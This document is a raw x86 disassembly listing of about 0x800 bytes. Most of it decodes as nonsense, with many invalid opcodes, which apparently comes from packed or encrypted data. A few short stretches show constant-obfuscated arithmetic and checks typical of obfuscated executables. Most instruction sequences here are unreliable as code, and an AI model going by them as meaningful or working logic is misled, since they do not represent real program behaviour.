  411869:	jb     0x4118e2
  41186b:	popf   
  41186c:	mov    edi,0x42832a9a
  411871:	inc    ebp
  411872:	and    DWORD PTR [ebp+0x712c26aa],esi
  411878:	ins    BYTE PTR es:[edi],dx
  411879:	lods   eax,DWORD PTR ds:[esi]
  41187a:	and    esp,DWORD PTR [ebx]
  41187c:	nop
  41187d:	add    BYTE PTR ds:[ebx+0x5e],0x1e
  411882:	pop    eax
  411883:	mov    al,0xc3
  411885:	daa    
  411886:	fild   WORD PTR [esi+0x5464e188]
  41188c:	rcr    BYTE PTR [edi+0x60],cl
  41188f:	pop    ebx
  411890:	mov    fs,ebp
  411892:	adc    eax,0x844e9fa6
  411897:	mov    ah,0x6d
  411899:	repnz ds pop eax
  41189c:	sub    BYTE PTR [esi-0x40],dh
  41189f:	pop    ebp
  4118a0:	fs (bad) 
  4118a3:	pushf  
  4118a4:	xor    DWORD PTR [eax+ecx*8],edx
  4118a7:	shl    DWORD PTR [ecx+0x73499406],1
  4118ad:	aad    0x60
  4118af:	es inc esi
  4118b1:	shr    DWORD PTR [ecx+0x4957d58e],cl
  4118b7:	push   ecx
  4118b8:	adc    bl,bl
  4118ba:	push   ebx
  4118bb:	push   ds
  4118bc:	lahf   
  4118bd:	xchg   edx,eax
  4118be:	loope  0x411843
  4118c0:	cdq    
  4118c1:	stos   DWORD PTR es:[edi],eax
  4118c2:	imul   ecx,DWORD PTR [eax+0xc],0x17eba301
  4118c9:	mov    ah,0x48
  4118cb:	sbb    al,ah
  4118cd:	push   cs
  4118ce:	nop
  4118cf:	add    ch,BYTE PTR gs:[ebp-0x64]
  4118d3:	popa   
  4118d4:	ds mov eax,0x6cb4b512
  4118da:	pop    eax
  4118db:	addr16 dec ecx
  4118dd:	js     0x4118f2
  4118df:	test   al,0x34
  4118e1:	gs scas eax,DWORD PTR es:[edi]
  4118e3:	cmp    ebp,DWORD PTR [eax]
  4118e5:	fstp   TBYTE PTR ds:0xcbcf5d86
  4118eb:	inc    ecx
  4118ec:	and    bl,bl
  4118ee:	(bad)  
  4118ef:	jno    0x41190a
  4118f1:	lea    esi,[edx+0x370294c7]
  4118f7:	jnp    0x41190d
  4118f9:	frstor [edx]
  4118fb:	mov    edi,0xbfd47334
  411900:	xchg   ecx,eax
  411901:	xor    eax,0xf625b8b1
  411906:	outs   dx,BYTE PTR ds:[esi]
  411907:	dec    esp
  411908:	jl     0x41192c
  41190a:	dec    esi
  41190b:	ret    
  41190c:	pop    eax
  41190d:	ins    BYTE PTR es:[edi],dx
  41190e:	adc    BYTE PTR [edi+0x356c514f],bl
  411914:	mov    eax,ds:0x12638ec0
  411919:	(bad)  
  41191a:	mov    eax,ds:0x33512eeb
  41191f:	jne    0x411917
  411921:	sbb    ebx,eax
  411923:	ret    
  411924:	dec    esp
  411925:	xor    eax,0x379771d4
  41192a:	sti    
  41192b:	es ret 
  41192d:	cs dec esp
  41192f:	pop    eax
  411930:	mov    bl,0x8f
  411932:	mov    ch,0x25
  411934:	neg    bh
  411936:	ret    0x26f9
  411939:	mov    edx,0x4d4f7e32
  41193e:	fcmovne st,st(4)
  411940:	xchg   ecx,eax
  411941:	push   0xffffff81
  411943:	add    ebx,edx
  411945:	int    0x12
  411947:	mov    WORD PTR [esi+0x46f87dde],?
  41194d:	les    esi,FWORD PTR [eax-0x54]
  411950:	mov    esi,0x4d7b827b
  411955:	cmp    eax,0x789419e8
  41195a:	sbb    cl,BYTE PTR [esi+0x43a90502]
  411960:	out    dx,eax
  411961:	call   FWORD PTR [ecx+eiz*4-0x1b]
  411965:	pop    edx
  411966:	jecxz  0x4118fc
  411968:	call   0x43fc4782
  41196d:	cs addr16 paddb mm3,mm0
  411972:	adc    al,0xaa
  411974:	pop    esp
  411975:	or     ebx,ebx
  411977:	or     bh,BYTE PTR [edx-0x78082776]
  41197d:	movaps XMMWORD PTR [edx-0x7b],xmm1
  411981:	test   eax,0x16f0a33e
  411986:	imul   edx,edx,0x2066453b
  41198c:	(bad)  
  41198e:	in     eax,dx
  41198f:	dec    esp
  411990:	je     0x4119f6
  411992:	xchg   esi,eax
  411993:	mov    edx,0xeeb8e5a0
  411998:	add    eax,0x8086054d
  41199d:	inc    edx
  41199e:	push   ds
  41199f:	jl     0x4119f6
  4119a1:	mov    edx,0xe1cc5016
  4119a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119a7:	or     BYTE PTR [eax+0x52],al
  4119aa:	inc    edx
  4119ab:	lahf   
  4119ac:	shl    DWORD PTR [ebx+0x481ad318],1
  4119b2:	in     al,dx
  4119b3:	pusha  
  4119b4:	std    
  4119b5:	scas   eax,DWORD PTR es:[edi]
  4119b6:	inc    ebp
  4119b7:	mov    edx,DWORD PTR [ebp-0x3c]
  4119ba:	xor    ecx,0xf3a
  4119c0:	or     ecx,eax
  4119c2:	mov    eax,ds:0x422518
  4119c7:	mov    eax,DWORD PTR [eax+0x1d8]
  4119cd:	mov    eax,DWORD PTR [eax]
  4119cf:	xor    esi,0x6665
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0x6a459ef9
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	ds dec ecx
  411a16:	shl    BYTE PTR [esi],0xc3
  411a19:	(bad)  
  411a1a:	push   edi
  411a1b:	pop    esp
  411a1c:	jns    0x411a30
  411a1e:	mov    eax,ds:0xfe5678cf
  411a23:	and    BYTE PTR [ecx],dl
  411a25:	mov    ah,0x6c
  411a27:	(bad)  
  411a28:	mov    dh,0xa9
  411a2a:	jb     0x411a91
  411a2c:	mov    ebp,0x6a9774c1
  411a31:	sbb    ch,ah
  411a33:	xchg   ecx,eax
  411a34:	(bad)  
  411a35:	sbb    eax,0xc8c89d38
  411a3a:	jae    0x4119df
  411a3c:	sub    edx,ebp
  411a3e:	mov    BYTE PTR [ebx-0x6d27ed9b],cl
  411a44:	ds mov ch,0x9
  411a47:	mov    DWORD PTR [ebx+esi*8+0x57e6ba0d],ebx
  411a4e:	ins    DWORD PTR es:[edi],dx
  411a4f:	mov    BYTE PTR [ebx-0x6d96c966],0xb9
  411a56:	xchg   esp,eax
  411a57:	pop    ds
  411a58:	adc    al,0xdf
  411a5a:	pusha  
  411a5b:	out    dx,al
  411a5c:	outs   dx,BYTE PTR ds:[esi]
  411a5d:	push   edi
  411a5e:	jbe    0x411ac9
  411a60:	pop    esp
  411a61:	repz mov ah,0x9d
  411a64:	xor    ch,BYTE PTR ds:0xf0a5bfec
  411a6a:	imul   ebx,ebp,0xffffffc7
  411a6d:	mov    bh,0xf9
  411a6f:	push   0xffffff97
  411a71:	lods   al,BYTE PTR ds:[esi]
  411a72:	daa    
  411a73:	test   eax,0x353e3ad1
  411a78:	pop    edx
  411a79:	jmp    0xde32ec68
  411a7e:	cmp    al,BYTE PTR [esi]
  411a80:	fwait
  411a81:	mov    ebx,edi
  411a83:	icebp  
  411a84:	xchg   esi,eax
  411a85:	push   esp
  411a86:	xor    edx,DWORD PTR [eax-0x7]
  411a89:	dec    edi
  411a8a:	xchg   ecx,eax
  411a8b:	outs   dx,BYTE PTR ds:[esi]
  411a8c:	mov    bh,0xe9
  411a8e:	sti    
  411a8f:	inc    edi
  411a90:	outs   dx,BYTE PTR ds:[esi]
  411a91:	dec    esp
  411a92:	pop    edi
  411a93:	cwde   
  411a94:	push   ss
  411a95:	add    al,0x2b
  411a97:	stc    
  411a98:	fisubr WORD PTR ds:0x643fbc99
  411a9e:	and    al,0x4
  411aa0:	je     0x411a56
  411aa2:	mov    esp,gs
  411aa4:	cli    
  411aa5:	int    0x74
  411aa7:	xchg   ebx,eax
  411aa8:	mov    eax,0x5257c2b7
  411aad:	add    eax,0x5565e4d6
  411ab2:	jns    0x411a7f
  411ab4:	add    ah,BYTE PTR [ecx-0x6e]
  411ab7:	mov    ebx,0x313e763
  411abc:	push   esi
  411abd:	es loop 0x411af5
  411ac0:	pop    eax
  411ac1:	int    0xa6
  411ac3:	xlat   BYTE PTR ds:[ebx]
  411ac4:	aas    
  411ac5:	mov    dh,0x1
  411ac7:	jae    0x411aa3
  411ac9:	mov    dh,0xd0
  411acb:	dec    ebp
  411acc:	lahf   
  411acd:	mov    ah,0x4f
  411acf:	fidiv  WORD PTR [edx+0x64]
  411ad2:	pop    ds
  411ad3:	jecxz  0x411ae5
  411ad5:	or     dh,BYTE PTR [ebx+edx*4+0x4]
  411ad9:	lahf   
  411ada:	(bad)  
  411adb:	lods   eax,DWORD PTR ds:[esi]
  411adc:	scas   eax,DWORD PTR es:[edi]
  411add:	sbb    bl,BYTE PTR [eax-0x3f]
  411ae0:	xor    BYTE PTR [edi+0x72],cl
  411ae3:	pop    ebx
  411ae4:	pop    ds
  411ae5:	(bad)  
  411ae6:	pop    ebp
  411ae7:	jo     0x411b48
  411ae9:	in     eax,0xe4
  411aeb:	fs pop esi
  411aed:	mov    BYTE PTR [ebp-0x5fe91a78],ah
  411af3:	(bad)  
  411af5:	cmp    dh,BYTE PTR [edx+0x23]
  411af8:	add    esi,esp
  411afa:	cmc    
  411afb:	sub    esi,DWORD PTR [esi]
  411afd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411afe:	les    ecx,FWORD PTR [edi+esi*1]
  411b01:	sbb    BYTE PTR [edx+edi*1+0x5dadd04e],dl
  411b08:	push   0x59
  411b0a:	retf   
  411b0b:	jns    0x411b31
  411b0d:	addr16 mov ds:0xc431,al
  411b11:	je     0x411b7d
  411b13:	jno    0x411b5a
  411b15:	pop    es
  411b16:	ins    DWORD PTR es:[edi],dx
  411b17:	rcl    bl,cl
  411b19:	(bad)  
  411b1a:	sbb    DWORD PTR [ebx],ebx
  411b1c:	fild   DWORD PTR [edx+0x27766e53]
  411b22:	retf   
  411b23:	push   es
  411b24:	dec    esi
  411b25:	cs sti 
  411b27:	push   DWORD PTR [ecx-0x37]
  411b2a:	stos   BYTE PTR es:[edi],al
  411b2b:	dec    edi
  411b2c:	and    ebx,ecx
  411b2e:	stos   BYTE PTR es:[edi],al
  411b2f:	into   
  411b30:	or     DWORD PTR [eax],edx
  411b32:	pop    ss
  411b33:	(bad)  
  411b34:	ja     0x411b65
  411b36:	xor    ch,BYTE PTR [esi]
  411b38:	std    
  411b39:	sub    DWORD PTR [ebp+0x4f4febf4],ebp
  411b3f:	lea    eax,[edi-0x41]
  411b42:	xchg   ecx,eax
  411b43:	pop    ss
  411b44:	mov    ?,WORD PTR ss:[ebp+0x3bd86e76]
  411b4b:	outs   dx,BYTE PTR ds:[esi]
  411b4c:	outs   dx,BYTE PTR ds:[esi]
  411b4d:	xchg   esp,eax
  411b4e:	sub    esi,edx
  411b50:	test   eax,0x87a9450a
  411b55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b56:	mov    edi,0x4572a092
  411b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b5c:	fwait
  411b5d:	dec    edx
  411b5e:	(bad)  
  411b5f:	ja     0x411b65
  411b61:	daa    
  411b62:	inc    edx
  411b63:	mov    dl,0xb2
  411b65:	imul   DWORD PTR [edi]
  411b67:	pop    ebx
  411b68:	adc    BYTE PTR [eax-0x113786ee],bl
  411b6e:	push   esi
  411b6f:	push   ebx
  411b70:	sahf   
  411b71:	sti    
  411b72:	icebp  
  411b73:	stc    
  411b74:	pop    ds
  411b75:	ret    0x3629
  411b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b79:	(bad)
  411b7d:	fcomp  QWORD PTR [edx+ebp*4-0xfacf0a9]
  411b84:	aad    0xeb
  411b86:	inc    esi
  411b87:	and    DWORD PTR [edi+0x797aeec8],ebx
  411b8d:	push   ebx
  411b8e:	test   eax,0x16939774
  411b93:	adc    dl,al
  411b95:	push   0x7152385a
  411b9a:	jo     0x411bdd
  411b9c:	retf   0xc7da
  411b9f:	and    ecx,ebx
  411ba1:	sub    ebp,edx
  411ba3:	or     eax,0x845aa81a
  411ba8:	fst    st(3)
  411baa:	adc    eax,0xe0360107
  411baf:	inc    ebp
  411bb0:	sti    
  411bb1:	push   esp
  411bb2:	into   
  411bb3:	inc    eax
  411bb4:	mov    ebx,0xf4dabef3
  411bb9:	in     al,dx
  411bba:	icebp  
  411bbb:	out    0x24,al
  411bbd:	out    dx,al
  411bbe:	scas   al,BYTE PTR es:[edi]
  411bbf:	in     al,0x2f
  411bc1:	push   ebx
  411bc2:	mov    WORD PTR [esi+ebp*8],?
  411bc5:	in     al,dx
  411bc6:	std    
  411bc7:	arpl   bp,bp
  411bc9:	mov    ecx,0x89aff886
  411bce:	cwde   
  411bcf:	in     eax,0xdf
  411bd1:	out    dx,eax
  411bd2:	nop
  411bd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bd4:	je     0x411c4c
  411bd6:	push   edi
  411bd7:	sti    
  411bd8:	or     eax,0x51c0ba40
  411bdd:	je     0x411c09
  411bdf:	and    BYTE PTR [eax-0x54],cl
  411be2:	cmc    
  411be3:	mov    ecx,0x2668ff0f
  411be8:	pop    es
  411be9:	icebp  
  411bea:	cmp    DWORD PTR [edi],esp
  411bec:	push   ebx
  411bed:	xchg   esi,eax
  411bee:	adc    ebp,esp
  411bf0:	fcmovnu st,st(0)
  411bf2:	popa   
  411bf3:	cdq    
  411bf4:	enter  0x9f3f,0x61
  411bf8:	mov    dh,0x46
  411bfa:	data16 cmc 
  411bfc:	or     dh,BYTE PTR [edx+eiz*2]
  411bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c00:	popa   
  411c01:	xor    edx,DWORD PTR [eax]
  411c03:	xor    esi,DWORD PTR [edx-0x76]
  411c06:	sbb    ch,bh
  411c08:	popa   
  411c09:	retf   0x4e7a
  411c0c:	and    eax,0x959f1b78
  411c11:	adc    al,0xbc
  411c13:	push   edi
  411c14:	ins    BYTE PTR es:[edi],dx
  411c15:	enter  0xa3e5,0xbf
  411c19:	cmp    ebx,DWORD PTR [ecx]
  411c1b:	cmp    al,0xa8
  411c1d:	xchg   BYTE PTR [ebx-0x12],ah
  411c20:	pop    esp
  411c21:	lods   eax,DWORD PTR ds:[esi]
  411c22:	xor    al,0x38
  411c24:	fwait
  411c25:	push   eax
  411c26:	shl    DWORD PTR [eax+edx*4],cl
  411c29:	shl    DWORD PTR [esi],cl
  411c2b:	stos   BYTE PTR es:[edi],al
  411c2c:	adc    al,BYTE PTR ss:[ebp+0x3e]
  411c30:	call   0x13274ec3
  411c35:	sbb    BYTE PTR [esp+esi*8],0xc7
  411c39:	test   al,0x64
  411c3b:	dec    ebp
  411c3c:	(bad)  
  411c3d:	in     eax,0x91
  411c3f:	sar    DWORD PTR [ebx+0xf],0x34
  411c43:	xchg   ebp,eax
  411c44:	cmp    ebp,DWORD PTR [ecx]
  411c46:	sbb    eax,0x835f74b7
  411c4b:	repz test BYTE PTR [ebx+0x64782366],dh
  411c52:	jp     0x411cb0
  411c54:	or     esp,esi
  411c56:	add    ch,bl
  411c58:	sbb    DWORD PTR [edi],0xffffffa2
  411c5b:	add    eax,0xb04637c8
  411c60:	jmp    0x411c41
  411c62:	ss ss scas al,BYTE PTR es:[edi]
  411c65:	ret    0x82a0
  411c68:	xchg   edi,eax
  411c69:	push   0x4d8b9380
  411c6e:	mov    ah,0x8b
  411c70:	push   ebp
  411c71:	mov    al,ds:0x5a4758b
  411c76:	sbb    BYTE PTR [eax+0x0],bh
  411c79:	add    BYTE PTR [ecx+0x87d1],al
  411c7f:	add    BYTE PTR [ebx],cl
  411c81:	ret    0x558b
  411c84:	nop
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8-0xaf095f8]
  411c98:	lea    esi,[eax+0x4f]
  411c9b:	push   0x18
  411c9d:	sbb    BYTE PTR [ecx+0x14],dh
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ca3:	jo     0x411c86
  411ca5:	cs loop 0x411d1f
  411ca8:	aas    
  411ca9:	sbb    bh,BYTE PTR [esi+esi*1+0x2e15a3b2]
  411cb0:	dec    eax
  411cb1:	adc    eax,0x722bb23d
  411cb6:	dec    esi
  411cb7:	scas   eax,DWORD PTR es:[edi]
  411cb8:	sti    
  411cb9:	xlat   BYTE PTR ds:[ebx]
  411cba:	adc    cl,ah
  411cbc:	sbb    DWORD PTR [ecx-0xf],edx
  411cbf:	mov    eax,DWORD PTR [edi]
  411cc1:	iret   
  411cc2:	(bad)  
  411cc3:	pop    esp
  411cc4:	nop
  411cc5:	dec    edx
  411cc6:	rcr    DWORD PTR [eax],cl
  411cc8:	jp     0x411c67
  411cca:	cmp    bh,bh
  411ccc:	push   edx
  411ccd:	jg     0x411cd9
  411ccf:	mov    edi,0x94a1b63c
  411cd4:	and    BYTE PTR [ecx+0x27],bl
  411cd7:	lahf   
  411cd8:	mov    ecx,0xcab5058f
  411cdd:	add    dh,BYTE PTR [eax-0x1a67ca07]
  411ce3:	test   al,0x5d
  411ce5:	or     esi,edi
  411ce7:	lods   eax,DWORD PTR ds:[esi]
  411ce8:	inc    edi
  411ce9:	ins    DWORD PTR es:[edi],dx
  411cea:	mov    ds:0xdbe033a2,eax
  411cef:	nop
  411cf0:	pusha  
  411cf1:	mov    esp,0x2e755d10
  411cf6:	jp     0x411cf4
  411cf8:	mov    dh,0x4
  411cfa:	inc    edx
  411cfb:	lock int 0xd6
  411cfe:	mov    WORD PTR [eax+0x4ed26128],cs
  411d04:	jne    0x411d7b
  411d06:	call   DWORD PTR [ecx]
  411d08:	sub    DWORD PTR [eax],0x5d3d9860
  411d0e:	fwait
  411d0f:	mov    bl,0xdb
  411d11:	or     DWORD PTR [ebx+0x7da8a2df],edx
  411d17:	inc    ebx
  411d18:	push   ebx
  411d19:	push   ds
  411d1a:	jnp    0x411d5d
  411d1c:	arpl   WORD PTR [esi-0x1864de01],si
  411d22:	xchg   esi,eax
  411d23:	nop
  411d24:	fwait
  411d25:	jp     0x411d1c
  411d27:	add    ah,BYTE PTR [ebx-0xaa40a99]
  411d2d:	dec    esp
  411d2e:	dec    esp
  411d2f:	pop    ebp
  411d30:	and    esi,0xfffffff9
  411d33:	dec    ebp
  411d34:	jo     0x411cc3
  411d36:	repz mov bh,0xa
  411d39:	mov    edi,0x9f80fa6c
  411d3e:	and    eax,0xf55203b6
  411d43:	test   eax,0xde1f31f8
  411d48:	or     al,0xaf
  411d4a:	cmp    eax,0x2095276
  411d4f:	mov    ds:0x1ccc950f,al
  411d54:	mov    ds:0x278e3c0e,al
  411d59:	cwde   
  411d5a:	push   eax
  411d5b:	clc    
  411d5c:	cli    
  411d5d:	mov    ds:0x6993f6e5,eax
  411d62:	sbb    eax,0x80ff5ddd
  411d67:	push   ebp
  411d68:	(bad)  
  411d69:	pop    edx
  411d6a:	icebp  
  411d6b:	out    0x57,eax
  411d6d:	add    esp,edi
  411d6f:	xchg   esi,eax
  411d70:	pop    ebx
  411d71:	fwait
  411d72:	iret   
  411d73:	xor    al,0xe4
  411d75:	xchg   ecx,eax
  411d76:	loope  0x411d7e
  411d78:	inc    edx
  411d79:	cmp    bh,BYTE PTR [ecx-0x2782638e]
  411d7f:	and    ch,bh
  411d81:	add    al,0x16
  411d83:	es mov ss:0x843f8232,eax
  411d8a:	pop    eax
  411d8b:	rcl    BYTE PTR [esi],0x8b
  411d8e:	jmp    0x411d8e
  411d90:	gs aas 
  411d92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d93:	mov    edi,0xd1e696b
  411d98:	xlat   BYTE PTR ds:[ebx]
  411d99:	xchg   edi,eax
  411d9a:	sbb    al,0x6f
  411d9c:	fist   WORD PTR [ebp+0x35]
  411d9f:	dec    ebx
  411da0:	and    al,0xcf
  411da2:	test   esi,esp
  411da4:	scas   eax,DWORD PTR es:[edi]
  411da5:	jne    0x411de4
  411da7:	pop    edi
  411da8:	xchg   ecx,eax
  411da9:	shl    BYTE PTR [edx+eax*2-0x807754b],1
  411db0:	jmp    0x424528a7
  411db5:	push   eax
  411db6:	xchg   ecx,eax
  411db7:	mov    cl,0x5a
  411db9:	rol    BYTE PTR [ebp+0x436e8c35],1
  411dbf:	xchg   edi,eax
  411dc0:	in     eax,0x8a
  411dc2:	jb     0x411d84
  411dc4:	aam    0xd9
  411dc6:	and    BYTE PTR ds:0x925eda1c,0x83
  411dcd:	add    DWORD PTR [ebp+0x1f],0xffffffdd
  411dd1:	dec    esi
  411dd2:	(bad)  
  411dd3:	lea    eax,[edi-0x500164bb]
  411dd9:	sti    
  411dda:	jo     0x411e08
  411ddc:	mov    bh,0xe3
  411dde:	inc    esi
  411ddf:	sbb    al,BYTE PTR [ebx]
  411de1:	xor    WORD PTR [esi+0x6c],bp
  411de5:	xabort 0x9d
  411de8:	scas   al,BYTE PTR es:[edi]
  411de9:	mov    al,ds:0x59c54f21
  411dee:	in     eax,dx
  411def:	push   cs
  411df0:	or     edx,DWORD PTR [edi+0x31b58021]
  411df6:	or     ch,bh
  411df8:	mov    edi,0x5070a2a5
  411dfd:	test   eax,0xa560cdb9
  411e02:	fisubr DWORD PTR [edi-0x45]
  411e05:	aaa    
  411e06:	loope  0x411db1
  411e08:	push   edx
  411e09:	jg     0x411e47
  411e0b:	test   eax,0x9338ad99
  411e10:	test   ecx,esi
  411e12:	jnp    0x411e4f
  411e14:	cmp    eax,0x61874709
  411e19:	(bad)  
  411e1a:	sub    ebp,DWORD PTR [esi-0x1e]
  411e1d:	mov    ebx,esp
  411e1f:	lea    edi,[edi]
  411e21:	mov    dl,0x16
  411e23:	shl    ebx,cl
  411e25:	ds fdivr st,st(4)
  411e28:	mov    ?,WORD PTR [edi]
  411e2a:	ret    
  411e2b:	cld    
  411e2c:	or     BYTE PTR [ecx-0x46],0x35
  411e30:	push   edx
  411e31:	add    esp,ecx
  411e33:	or     esi,edx
  411e35:	add    BYTE PTR [ebx+0x283142a8],cl
  411e3b:	adc    eax,0xde230a19
  411e40:	mov    al,ds:0xc5b805e9
  411e45:	not    DWORD PTR [ecx-0x10]
  411e48:	retf   0xff53
  411e4b:	leave  
  411e4c:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e4e:	add    bh,BYTE PTR [edx+0x57]
  411e51:	inc    edx
  411e52:	dec    DWORD PTR [esp+esi*1]
  411e55:	(bad)  
  411e56:	mov    bh,0x32
  411e58:	mov    bl,0x6
  411e5a:	sahf   
  411e5b:	adc    BYTE PTR [edi+esi*2],dh
  411e5e:	push   edx
  411e5f:	push   ds
  411e60:	sar    bl,cl
  411e62:	call   0x51c6:0xa9fa23b5
  411e69:	nop
  411e6a:	and    BYTE PTR [esi+0x3b08313d],0x81
  411e71:	enter  0x3ba9,0x6f
  411e75:	or     ah,BYTE PTR [edx-0x66]
  411e78:	cmp    BYTE PTR [edi+eax*4-0x2753ec3],0xfb
  411e80:	pop    ebx
  411e81:	imul   edi,DWORD PTR [esi+0x3f],0xffffffa7
  411e85:	popa   
  411e86:	std    
  411e87:	xor    eax,0x4a8660c9
  411e8c:	aaa    
  411e8d:	pushf  
  411e8e:	rcr    DWORD PTR [esi*4-0x1a4bfed0],0x24
  411e96:	or     dh,BYTE PTR [esi-0xf81eb22]
  411e9c:	mov    ebp,0x474a8071
  411ea1:	or     dh,dl
  411ea3:	or     BYTE PTR [eax],bh
  411ea5:	in     al,0xbb
  411ea7:	aaa    
  411ea8:	sub    al,0xcb
  411eaa:	cmp    DWORD PTR ds:0xd840cc41,ebx
  411eb0:	adc    ebp,eax
  411eb2:	or     DWORD PTR [ebx-0x15353040],0xa0cce49
  411ebc:	scas   eax,DWORD PTR es:[edi]
  411ebd:	test   DWORD PTR [ebx-0x514748f],ebp
  411ec3:	add    DWORD PTR [edx+0x24],ebp
  411ec6:	mov    ecx,0x4d7e8e2b
  411ecb:	loopne 0x411f2d
  411ecd:	retf   
  411ece:	cld    
  411ecf:	lahf   
  411ed0:	std    
  411ed1:	call   0xe216:0xb756748d
  411ed8:	mov    bl,0xae
  411eda:	add    ch,0x98
  411edd:	cmp    edi,edi
  411edf:	(bad)  
  411ee0:	mov    edx,0x4135b7d0
  411ee5:	ss pop edx
  411ee7:	int3   
  411ee8:	dec    ecx
  411ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eea:	std    
  411eeb:	push   ebx
  411eec:	jmp    0x2fad3dad
  411ef1:	(bad)  
  411ef2:	mov    eax,0xb6e8abc7
  411ef7:	xchg   ebx,eax
  411ef8:	jecxz  0x411ede
  411efa:	or     ecx,esi
  411efc:	mov    esi,DWORD PTR [ebp-0x6c]
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x422518
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x4225b4
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x4225ac,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	pop    esi
  411faa:	ds dec ecx
  411fac:	push   0xffffffa6
  411fae:	data16 sbb BYTE PTR [eax],bl
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	data16 (bad) 
  411fb7:	into   
  411fb8:	es and al,0x8f
  411fbb:	repnz or BYTE PTR [esp+eax*2+0x26],bh
  411fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fc1:	enter  0x25c,0xe2
  411fc5:	mov    al,0xd7
  411fc7:	dec    edx
  411fc8:	xlat   BYTE PTR ds:[ebx]
  411fc9:	add    al,0x41
  411fcb:	out    dx,eax
  411fcc:	xor    eax,0xc26cd6e2
  411fd1:	fwait
  411fd2:	repnz cli 
  411fd4:	sti    
  411fd5:	xor    dl,dh
  411fd7:	pop    edi
  411fd8:	xchg   DWORD PTR ds:0x6feb07e,ebp
  411fde:	icebp  
  411fdf:	div    BYTE PTR [ebp+0x2d]
  411fe2:	sub    BYTE PTR [esp+ebx*2],al
  411fe5:	fs dec esi
  411fe7:	fs xchg edx,eax
  411fe9:	jmp    0xfb26:0xe9294ce1
  411ff0:	xlat   BYTE PTR ds:[ebx]
  411ff1:	and    BYTE PTR [esi],al
  411ff3:	lods   eax,DWORD PTR ds:[esi]
  411ff4:	push   eax
  411ff5:	fistp  DWORD PTR [esi+esi*4+0x6f38c502]
  411ffc:	pop    eax
  411ffd:	mov    eax,0x1255ac04
  412003:	jle    0x411fbc
  412005:	mov    edi,0xcc24efaf
  41200a:	jno    0x41202f
  41200c:	out    dx,eax
  41200d:	loope  0x411f91
  41200f:	fimul  DWORD PTR [ebx+0x71]
  412012:	test   eax,0xe72cda2b
  412017:	leave  
  412018:	bound  esp,QWORD PTR [edi+0x73]
  41201b:	sub    DWORD PTR [edx],edx
  41201d:	sbb    eax,0x9850d3e7
  412022:	addr16 jge 0x41202b
  412025:	jl     0x41204e
  412027:	lds    ecx,FWORD PTR [edx+0x2c]
  41202a:	(bad)  
  41202b:	cli    
  41202c:	pop    ebp
  41202d:	inc    eax
  41202e:	sbb    ebx,esi
  412030:	sahf   
  412031:	test   al,0x19
  412033:	inc    ecx
  412034:	pop    edx
  412035:	enter  0x873b,0xab
  412039:	dec    edi
  41203a:	xchg   ebp,eax
  41203b:	xchg   esp,eax
  41203c:	cmp    eax,0xb3a4707e
  412041:	(bad)  
  412042:	das    
